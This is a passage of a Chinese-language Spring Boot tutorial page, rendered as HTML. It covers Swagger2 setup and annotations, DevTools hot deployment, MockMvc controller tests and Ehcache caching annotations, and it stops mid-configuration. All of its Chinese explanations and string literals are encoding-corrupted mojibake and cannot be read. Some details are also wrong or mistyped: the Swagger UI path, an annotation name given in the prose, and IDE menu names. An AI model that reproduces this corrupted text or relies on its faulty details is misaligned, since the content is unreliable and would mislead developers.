class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ·»åŠ é…ç½®ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableSwagger2</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Swagger2</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Docket <span class="title function_">createRestApi</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">            .apiInfo(apiInfo())</span><br><span class="line">            .select()</span><br><span class="line">            .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.xxxx.springboot.controller&quot;</span>))</span><br><span class="line">            .paths(PathSelectors.any())</span><br><span class="line">            .build();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> ApiInfo <span class="title function_">apiInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApiInfoBuilder</span>()</span><br><span class="line">            .title(<span class="string">&quot;ç”¨æˆ·ç®¡ç†æ¥å£APIæ–‡æ¡£&quot;</span>)</span><br><span class="line">            .version(<span class="string">&quot;1.0&quot;</span>)</span><br><span class="line">            .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¸¸ç”¨æ³¨è§£"><a href="#å¸¸ç”¨æ³¨è§£" class="headerlink" title="å¸¸ç”¨æ³¨è§£"></a>å¸¸ç”¨æ³¨è§£</h3><p><strong><code>@Api</code></strong></p><p>ç”¨åœ¨è¯·æ±‚çš„ç±»ä¸Šï¼Œå…·æœ‰<code>tag</code>å±æ€§ï¼Œè¯´æ˜è¯¥ç±»çš„ä½œç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Api(tags=&quot;APPç”¨æˆ·æ³¨å†ŒController&quot;)</span></span><br></pre></td></tr></table></figure><p><strong><code>@ApiOperation</code></strong></p><p>ç”¨åœ¨è¯·æ±‚çš„æ–¹æ³•ä¸Šï¼Œè¯´æ˜æ–¹æ³•çš„ä½œç”¨ï¼Œ<code>value</code>å±æ€§è¯´æ˜æ–¹æ³•çš„ä½œç”¨ï¼Œ<code>notes</code>å±æ€§ä¸ºæ–¹æ³•çš„å¤‡æ³¨è¯´æ˜</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value=&quot;ç”¨æˆ·æ³¨å†Œ&quot;, notes=&quot;æ‰‹æœºå·ã€å¯†ç éƒ½æ˜¯å¿…å¡«é¡¹ï¼Œå¹´é¾„æ˜¯é€‰å¡«é¡¹ï¼Œä½†å¿…é¡»æ˜¯æ•°å­—&quot;)</span></span><br></pre></td></tr></table></figure><p><strong><code>@ApiImplicitParams</code></strong></p><p>ç”¨åœ¨è¯·æ±‚çš„æ–¹æ³•ä¸Šï¼ŒåŒ…å«ä¸€ç»„å‚æ•°è¯´æ˜ï¼Œ<code>@ApiImplicitParam</code>ç”¨åœ¨ <code>@ApiImplicitParams</code> æ³¨è§£ä¸­ï¼ŒæŒ‡å®šä¸€ä¸ªè¯·æ±‚å‚æ•°çš„é…ç½®ä¿¡æ¯</p><table><thead><tr><th align="left">å±æ€§å</th><th align="left">è¯´æ˜</th><th align="left">ç¤ºä¾‹å€¼</th></tr></thead><tbody><tr><td align="left"><strong>name</strong></td><td align="left">å‚æ•°å</td><td align="left"><code>&quot;userId&quot;</code></td></tr><tr><td align="left"><strong>value</strong></td><td align="left">å‚æ•°çš„æ±‰å­—è¯´æ˜ã€è§£é‡Š</td><td align="left"><code>&quot;ç”¨æˆ·ID&quot;</code></td></tr><tr><td align="left"><strong>required</strong></td><td align="left">å‚æ•°æ˜¯å¦å¿…é¡»ä¼ </td><td align="left"><code>true</code> &#x2F; <code>false</code></td></tr><tr><td align="left"><strong>paramType</strong></td><td align="left">å‚æ•°æ”¾åœ¨å“ªä¸ªåœ°æ–¹</td><td align="left"><code>&quot;header&quot;</code> &#x2F; <code>&quot;query&quot;</code> &#x2F; <code>&quot;path&quot;</code> &#x2F; <code>&quot;body&quot;</code> &#x2F; <code>&quot;form&quot;</code></td></tr><tr><td align="left"><strong>å¯¹åº”æ³¨è§£</strong></td><td align="left">è¯·æ±‚å‚æ•°è·å–æ–¹å¼</td><td align="left"><code>@RequestHeader</code> &#x2F; <code>@RequestParam</code> &#x2F; <code>@PathVariable</code></td></tr><tr><td align="left"><strong>datatype</strong></td><td align="left">å‚æ•°ç±»å‹ï¼Œé»˜è®¤ä¸ºString</td><td align="left"><code>&quot;Integer&quot;</code> &#x2F; <code>&quot;String&quot;</code> &#x2F; <code>&quot;Boolean&quot;</code></td></tr><tr><td align="left"><strong>defaultValue</strong></td><td align="left">å‚æ•°çš„é»˜è®¤å€¼</td><td align="left"><code>&quot;0&quot;</code> &#x2F; <code>&quot;default&quot;</code></td></tr></tbody></table><p><code>paramType</code> å¯¹åº”å…³ç³»</p><table><thead><tr><th align="left">paramType å€¼</th><th align="left">å¯¹åº”æ³¨è§£</th><th align="left">ä½¿ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left"><code>header</code></td><td align="left"><code>@RequestHeader</code></td><td align="left">ä»è¯·æ±‚å¤´è·å–å‚æ•°</td></tr><tr><td align="left"><code>query</code></td><td align="left"><code>@RequestParam</code></td><td align="left">ä»URLæŸ¥è¯¢å‚æ•°è·å–</td></tr><tr><td align="left"><code>path</code></td><td align="left"><code>@PathVariable</code></td><td align="left">ä»URLè·¯å¾„è·å–ï¼ˆRESTfulæ¥å£ï¼‰</td></tr><tr><td align="left"><code>body</code></td><td align="left"><code>@RequestBody</code></td><td align="left">ä»è¯·æ±‚ä½“è·å–ï¼ˆä¸å¸¸ç”¨ï¼‰</td></tr><tr><td align="left"><code>form</code></td><td align="left">-</td><td align="left">è¡¨å•æäº¤ï¼ˆä¸å¸¸ç”¨ï¼‰</td></tr></tbody></table><p>ç¤ºä¾‹å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiImplicitParams(&#123;</span></span><br><span class="line"><span class="meta">    @ApiImplicitParam(name=&quot;mobile&quot;, value=&quot;æ‰‹æœºå·&quot;, required=true, paramType=&quot;form&quot;),</span></span><br><span class="line"><span class="meta">    @ApiImplicitParam(name=&quot;password&quot;, value=&quot;å¯†ç &quot;, required=true, paramType=&quot;form&quot;),</span></span><br><span class="line"><span class="meta">    @ApiImplicitParam(name=&quot;age&quot;, value=&quot;å¹´é¾„&quot;, required=true, paramType=&quot;form&quot;, dataType=&quot;Integer&quot;)</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure><p><strong><code>@ApiResponses</code></strong></p><p>ç”¨äºè¯·æ±‚çš„æ–¹æ³•ä¸Šï¼Œè¡¨ç¤ºä¸€ç»„å“åº”ï¼Œ<code>@ApiResponse</code>ç”¨åœ¨ <code>@ApiResponses</code> ä¸­ï¼Œä¸€èˆ¬ç”¨äºè¡¨è¾¾ä¸€ä¸ªé”™è¯¯çš„å“åº”ä¿¡æ¯</p><table><thead><tr><th align="left">å±æ€§å</th><th align="left">è¯´æ˜</th><th align="left">ç¤ºä¾‹å€¼</th></tr></thead><tbody><tr><td align="left"><strong>code</strong></td><td align="left">HTTP çŠ¶æ€ç </td><td align="left"><code>400</code>, <code>404</code>, <code>500</code></td></tr><tr><td align="left"><strong>message</strong></td><td align="left">å“åº”ä¿¡æ¯æè¿°</td><td align="left"><code>&quot;è¯·æ±‚å‚æ•°æ²¡å¡«å¥½&quot;</code>, <code>&quot;ç”¨æˆ·ä¸å­˜åœ¨&quot;</code></td></tr><tr><td align="left"><strong>response</strong></td><td align="left">æŠ›å‡ºçš„å¼‚å¸¸ç±»ï¼ˆå¯é€‰ï¼‰</td><td align="left"><code>IllegalArgumentException.class</code>, <code>UserNotFoundException.class</code></td></tr></tbody></table><p>ç¤ºä¾‹å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;selectè¯·æ±‚&quot;, notes = &quot;å¤šä¸ªå‚æ•°ï¼Œå¤šç§çš„æŸ¥è¯¢å‚æ•°ç±»å‹&quot;)</span></span><br><span class="line"><span class="meta">@ApiResponses(&#123;</span></span><br><span class="line"><span class="meta">    @ApiResponse(code = 400, message = &quot;è¯·æ±‚å‚æ•°æ²¡å¡«å¥½&quot;),</span></span><br><span class="line"><span class="meta">    @ApiResponse(code = 404, message = &quot;è¯·æ±‚è·¯å¾„æ²¡æœ‰æˆ–é¡µé¢è·³è½¬è·¯å¾„ä¸å¯¹&quot;)</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure><p><strong><code>@ApiModel</code></strong></p><p>ç”¨äºå“åº”ç±»ä¸Šï¼Œè¡¨ç¤ºä¸€ä¸ªè¿”å›å“åº”æ•°æ®çš„ä¿¡æ¯ï¼ˆè¿™ç§ä¸€èˆ¬ç”¨åœ¨poståˆ›å»ºçš„æ—¶å€™ï¼Œä½¿ç”¨<code>@RequestBody</code>è¿™æ ·çš„åœºæ™¯ï¼Œè¯·æ±‚å‚æ•°æ— æ³•ä½¿ç”¨<code>@ApiImplicitParam</code>æ³¨è§£è¿›è¡Œæè¿°çš„æ—¶å€™ï¼‰ï¼Œ<code>@ApiModelProperty</code>ç”¨åœ¨å±æ€§ä¸Šï¼Œæè¿°å“åº”ç±»çš„å±æ€§</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiModel(description = &quot;è¿”å›å“åº”æ•°æ®&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestMessage</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;æ˜¯å¦æˆåŠŸ&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;è¿”å›å¯¹è±¡&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Object data;</span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;é”™è¯¯ç¼–å·&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Integer errCode;</span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;é”™è¯¯ä¿¡æ¯&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯åŠ¨é¡¹ç›®ï¼Œè®¿é—®é¡¹ç›®é¡µé¢<code>/swagger_ui.html</code>å³å¯æŸ¥çœ‹æ¥å£æ–‡æ¡£ï¼Œä¾‹å¦‚<code>http://localhost:8080/swagger_ui.htm</code>l</p><br/><h2 id="åº”ç”¨çƒ­éƒ¨ç½²"><a href="#åº”ç”¨çƒ­éƒ¨ç½²" class="headerlink" title="åº”ç”¨çƒ­éƒ¨ç½²"></a>åº”ç”¨çƒ­éƒ¨ç½²</h2><p>çƒ­éƒ¨ç½²æ˜¯æŒ‡åœ¨ä¸é‡å¯åº”ç”¨çš„æƒ…å†µä¸‹ï¼Œå®æ—¶æ›´æ–°ä»£ç ã€ä¿®å¤ç¼ºé™·æˆ–å¢åŠ åŠŸèƒ½ï¼Œä½¿ä¿®æ”¹ç«‹å³ç”Ÿæ•ˆ</p><h3 id="é…ç½®ä¸ä½¿ç”¨"><a href="#é…ç½®ä¸ä½¿ç”¨" class="headerlink" title="é…ç½®ä¸ä½¿ç”¨"></a>é…ç½®ä¸ä½¿ç”¨</h3><p>æ·»åŠ <code>DevTools</code>ä¾èµ–é¡¹</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- DevTools çš„ä¾èµ– --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--å½“å‰è¿™ä¸ªé¡¹ç›®è¢«ç»§æ‰¿ä¹‹åï¼Œè¿™ä¸ªä¸å‘ä¸‹ä¼ é€’--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ—¶åœ¨ plugin ä¸­æ·»åŠ  devtools ç”Ÿæ•ˆæ ‡å¿—</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fork</span>&gt;</span>true<span class="tag">&lt;/<span class="name">fork</span>&gt;</span><span class="comment">&lt;!-- å¦‚æœæ²¡æœ‰è¯¥é…ç½®ï¼Œçƒ­éƒ¨ç½²çš„devtoolsä¸ç”Ÿæ•ˆ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¨å±€æ–‡ä»¶é…é…ç½®ï¼Œå°† <code>spring.devtools.restart.enabled</code> è®¾ä¸º <code>false</code>ï¼Œåˆ™é‡å¯åŠŸèƒ½ä¼šè¢«ç¦ç”¨ï¼Œä½†ç±»åŠ è½½å™¨ä»ç„¶ä¼šåˆå§‹åŒ–</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="comment">## çƒ­éƒ¨ç½²é…ç½®</span></span><br><span class="line">  <span class="attr">devtools:</span></span><br><span class="line">    <span class="attr">restart:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">      <span class="comment"># è®¾ç½®é‡å¯çš„ç›®å½•ï¼Œæ·»åŠ ç›®å½•çš„æ–‡ä»¶éœ€è¦ restart</span></span><br><span class="line">      <span class="attr">additional-paths:</span> <span class="string">src/main/java</span></span><br><span class="line">      <span class="comment"># è§£å†³é¡¹ç›®è‡ªåŠ¨é‡æ–°ç¼–è¯‘åæ¥å£æŠ¥404çš„é—®é¢˜</span></span><br><span class="line">      <span class="attr">poll-interval:</span> <span class="number">3000</span></span><br><span class="line">      <span class="attr">quiet-period:</span> <span class="number">1000</span></span><br></pre></td></tr></table></figure><p>IDEAé…ç½®è‡ªåŠ¨ç¼–è¯‘ï¼ŒFile-&gt;Strrings-&gt;Compiler-&gt;Build Project automatically</p><p>Help -&gt; ind Action -&gt;æœç´¢Registry-&gt;å‹¾é€‰<code>compiler.automake.allow.when.app.running</code></p><br/><h2 id="å•å…ƒæµ‹è¯•"><a href="#å•å…ƒæµ‹è¯•" class="headerlink" title="å•å…ƒæµ‹è¯•"></a>å•å…ƒæµ‹è¯•</h2><p>åšè¿‡ web é¡¹ç›®å¼€å‘çš„å¯¹äºå•å…ƒæµ‹è¯•éƒ½ä¸é™Œç”Ÿã€‚SpringBoot æ¡†æ¶å¯¹å•å…ƒæµ‹è¯•ä¹Ÿæä¾›äº†è‰¯å¥½çš„æ”¯æŒï¼Œå¯ä»¥å¿«é€Ÿã€æ°å½“åœ°æµ‹è¯•ä¸šåŠ¡ä»£ç åŠŸèƒ½</p><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>æ·»åŠ ä¾èµ–é¡¹</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Serviceä¸šåŠ¡æ–¹æ³•æµ‹è¯•"><a href="#Serviceä¸šåŠ¡æ–¹æ³•æµ‹è¯•" class="headerlink" title="Serviceä¸šåŠ¡æ–¹æ³•æµ‹è¯•"></a>Serviceä¸šåŠ¡æ–¹æ³•æµ‹è¯•</h3><p>ä½¿ç”¨@Runwithæ³¨è§£æŒ‡å®šç‰¹å®šçš„ç±»è¿›è¡Œå•å…ƒæµ‹è¯•ï¼Œåœ¨Springç¯å¢ƒä¸‹çš„å•å…ƒæµ‹è¯•ä½¿ç”¨<code>SpringRunner.class</code>ï¼Œä½¿ç”¨<code>@SpringBootTest</code>æ³¨è§£æŒ‡å®šå…¥å£ç±»ï¼Œé€šå¸¸æ˜¯ <code>@SpringBootApplication</code> æ³¨è§£çš„ä¸»ç±»</p><p>ä½¿ç”¨<code>@Before</code>æ³¨è§£è®¾å®šåœ¨æµ‹è¯•æ–¹æ³•æ‰§è¡Œå‰çš„è¡Œä¸ºï¼Œ<code>@After</code>æ³¨è§£è®¾å®šåœ¨æµ‹è¯•æ–¹æ³•æ‰§è¡Œåçš„è¡Œä¸ºï¼Œ<code>@Test</code>æ³¨è§£æ ‡è®°è¦æµ‹è¯•çš„æ–¹æ³•</p><h3 id="æ§åˆ¶å±‚æ¥å£æ–¹æ³•æµ‹è¯•"><a href="#æ§åˆ¶å±‚æ¥å£æ–¹æ³•æµ‹è¯•" class="headerlink" title="æ§åˆ¶å±‚æ¥å£æ–¹æ³•æµ‹è¯•"></a>æ§åˆ¶å±‚æ¥å£æ–¹æ³•æµ‹è¯•</h3><p>è§†å›¾å±‚ä»£ç ä½¿ç”¨ MockMvc è¿›è¡Œæµ‹è¯•ï¼Œå…¶å®ç°äº†å¯¹httpè¯·æ±‚çš„æ¨¡æ‹Ÿï¼Œä¸éœ€ä¾èµ–ç½‘è·¯ç¯å¢ƒï¼Œä½¿ç”¨<code>@AutoConfigureMvc</code>æ³¨è§£è¿›è¡Œä½¿ç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="meta">@SpringBootTest(classes = &#123;Starter.class&#125;)</span></span><br><span class="line"><span class="meta">@AutoConfigureMockMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestUserController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(TestUserController.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> MockMvc mockMvc;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">apiTest01</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MockHttpServletRequestBuilder</span> <span class="variable">request</span> <span class="operator">=</span> MockMvcRequestBuilders.get(<span class="string">&quot;/user/list&quot;</span>)</span><br><span class="line">                .contentType(<span class="string">&quot;text/html&quot;</span>)</span><br><span class="line">                .accept(MediaType.APPLICATION_JSON);</span><br><span class="line"></span><br><span class="line">        <span class="type">ResultActions</span> <span class="variable">perform</span> <span class="operator">=</span> mockMvc.perform(request);</span><br><span class="line"></span><br><span class="line">        perform.andExpect(MockMvcResultMatchers.status().isOk());</span><br><span class="line"></span><br><span class="line">        <span class="type">MvcResult</span> <span class="variable">mvcResult</span> <span class="operator">=</span> perform.andReturn();</span><br><span class="line"></span><br><span class="line">        <span class="type">MockHttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> mvcResult.getResponse();</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&quot;å“åº”çŠ¶æ€: &#123;&#125;&quot;</span>, response.getStatus());</span><br><span class="line">        log.info(<span class="string">&quot;å“åº”å†…å®¹: &#123;&#125;&quot;</span>, response.getContentAsString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="åˆ†å¸ƒå¼ç¼“å­˜Ehcacheé›†æˆ"><a href="#åˆ†å¸ƒå¼ç¼“å­˜Ehcacheé›†æˆ" class="headerlink" title="åˆ†å¸ƒå¼ç¼“å­˜Ehcacheé›†æˆ"></a>åˆ†å¸ƒå¼ç¼“å­˜Ehcacheé›†æˆ</h2><p>EhCache æ˜¯ä¸€ä¸ªæˆç†Ÿçš„ Java ç¼“å­˜æ¡†æ¶ï¼Œæœ€åˆä» Hibernate å‘å±•è€Œæ¥ã€‚å®ƒæ˜¯è¿›ç¨‹å†…ç¼“å­˜ç³»ç»Ÿï¼Œæä¾›äº†å¤šç§çµæ´»çš„ç¼“å­˜ç®¡ç†æ–¹æ¡ˆï¼ŒåŒ…æ‹¬å†…å­˜å­˜å‚¨ã€ç£ç›˜æ–‡ä»¶å­˜å‚¨å’Œåˆ†å¸ƒå¼å­˜å‚¨æ–¹å¼ï¼Œå…·æœ‰å¿«é€Ÿã€ç®€å•çš„ç‰¹ç‚¹</p><h3 id="ç›¸å…³æ³¨è§£"><a href="#ç›¸å…³æ³¨è§£" class="headerlink" title="ç›¸å…³æ³¨è§£"></a>ç›¸å…³æ³¨è§£</h3><p><strong><code>@CacheConfig</code> æ³¨è§£</strong></p><p>æ ‡æ³¨åœ¨ç±»ä¸Šï¼Œç”¨äºé…ç½®è¯¥ç±»ä¸­æ‰€æœ‰ç¼“å­˜æ–¹æ³•çš„å…¬å…±å±æ€§ï¼Œä¾‹å¦‚è®¾ç½®ç¼“å­˜åç§°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CacheConfig(cacheNames = &quot;users&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure><p><strong><code>@Cacheable</code> æ³¨è§£</strong></p><p>åº”ç”¨åˆ°è¯»å–æ•°æ®çš„æ–¹æ³•ä¸Šï¼Œå³å¯ç¼“å­˜çš„æ–¹æ³•ï¼Œå¦‚æŸ¥æ‰¾æ–¹æ³•ã€‚å®ƒé¦–å…ˆä»ç¼“å­˜ä¸­è¯»å–æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰å‘½ä¸­ï¼Œå†è°ƒç”¨ç›¸åº”æ–¹æ³•è·å–æ•°æ®ï¼Œç„¶åæŠŠæ•°æ®æ·»åŠ åˆ°ç¼“å­˜ä¸­</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">ä½œç”¨</th></tr></thead><tbody><tr><td align="left"><strong>value</strong></td><td align="left">æŒ‡å®šç¼“å­˜å­˜å‚¨çš„é›†åˆå</td></tr><tr><td align="left"><strong>cacheNames</strong></td><td align="left">value çš„åˆ«åï¼ˆSpring 4 æ–°å¢ï¼‰</td></tr><tr><td align="left"><strong>key</strong></td><td align="left">ç¼“å­˜å¯¹è±¡åœ¨ Map ä¸­çš„ key å€¼</td></tr><tr><td align="left"><strong>condition</strong></td><td align="left">ç¼“å­˜æ¡ä»¶ï¼ˆè°ƒç”¨å‰åˆ¤æ–­ï¼‰</td></tr><tr><td align="left"><strong>unless</strong></td><td align="left">ç¼“å­˜æ¡ä»¶ï¼ˆè°ƒç”¨ååˆ¤æ–­ï¼‰</td></tr><tr><td align="left"><strong>keyGenerator</strong></td><td align="left">æŒ‡å®šè‡ªå®šä¹‰ key ç”Ÿæˆå™¨</td></tr><tr><td align="left"><strong>cacheResolver</strong></td><td align="left">æŒ‡å®šç¼“å­˜è§£æå™¨</td></tr><tr><td align="left"><strong>cacheManager</strong></td><td align="left">æŒ‡å®šç¼“å­˜ç®¡ç†å™¨</td></tr></tbody></table><p><strong><code>@CachePut</code> æ³¨è§£</strong></p><p>åº”ç”¨åˆ°å†™æ•°æ®çš„æ–¹æ³•ä¸Šï¼Œå¦‚æ–°å¢ã€ä¿®æ”¹æ–¹æ³•ã€‚è°ƒç”¨æ–¹æ³•æ—¶ä¼šè‡ªåŠ¨æŠŠç›¸åº”çš„æ•°æ®æ”¾å…¥ç¼“å­˜ã€‚<code>@CachePut</code> çš„å‚æ•°ä¸ <code>@Cacheable</code> ç±»ä¼¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CachePut(value = &quot;user&quot;, key = &quot;#user.id&quot;)</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">save</span><span class="params">(User user)</span> &#123;</span><br><span class="line">    users.add(user);</span><br><span class="line">    <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>@CacheEvict</code> æ³¨è§£</strong></p><p>åº”ç”¨åˆ°ç§»é™¤æ•°æ®çš„æ–¹æ³•ä¸Šï¼Œå¦‚åˆ é™¤æ–¹æ³•ã€‚è°ƒç”¨æ–¹æ³•æ—¶ä¼šä»ç¼“å­˜ä¸­ç§»é™¤ç›¸åº”çš„æ•°æ®</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CacheEvict(value = &quot;user&quot;, key = &quot;#id&quot;)</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(<span class="keyword">final</span> Integer id)</span>;</span><br></pre></td></tr></table></figure><p>é™¤äº†åŒ <code>@Cacheable</code> ä¸€æ ·çš„å‚æ•°ä¹‹å¤–ï¼Œ<code>@CacheEvict</code> è¿˜æœ‰ä¸‹é¢ä¸¤ä¸ªå‚æ•°ï¼š</p><p><code>allEntries</code>éå¿…éœ€ï¼Œé»˜è®¤ä¸º falseã€‚å½“ä¸º true æ—¶ï¼Œä¼šç§»é™¤æ‰€æœ‰æ•°æ®</p><p><code>beforeInvocation</code>éå¿…éœ€ï¼Œé»˜è®¤ä¸º falseï¼Œä¼šåœ¨è°ƒç”¨æ–¹æ³•ä¹‹åç§»é™¤æ•°æ®ã€‚å½“ä¸º true æ—¶ï¼Œä¼šåœ¨è°ƒç”¨æ–¹æ³•ä¹‹å‰ç§»é™¤æ•°æ®</p><p><strong><code>@Caching</code>æ³¨è§£</strong> </p><p>ç”¨äºç»„åˆå¤šä¸ª Cache æ³¨è§£ä½¿ç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Caching(</span></span><br><span class="line"><span class="meta">    put = &#123;</span></span><br><span class="line"><span class="meta">        @CachePut(value = &quot;user&quot;, key = &quot;#user.id&quot;),</span></span><br><span class="line"><span class="meta">        @CachePut(value = &quot;user&quot;, key = &quot;#user.username&quot;),</span></span><br><span class="line"><span class="meta">        @CachePut(value = &quot;user&quot;, key = &quot;#user.age&quot;)</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta">)</span></span><br></pre></td></tr></table></figure><h3 id="ç¯å¢ƒé…ç½®-1"><a href="#ç¯å¢ƒé…ç½®-1" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h3><p>æ·»åŠ ä¾èµ–é¡¹</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Ehcache --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-cache<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.sf.ehcache<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ehcache<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>resources</code>ç›®å½•ä¸‹æ–°å»º<code>ehcache.xml</code>ï¼Œç”¨äºç›¸å…³é…ç½®</p><p>è¿›è¡Œå…¨å±€é…ç½®</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="comment">## Ehcacheç¼“å­˜é…ç½®</span></span><br><span 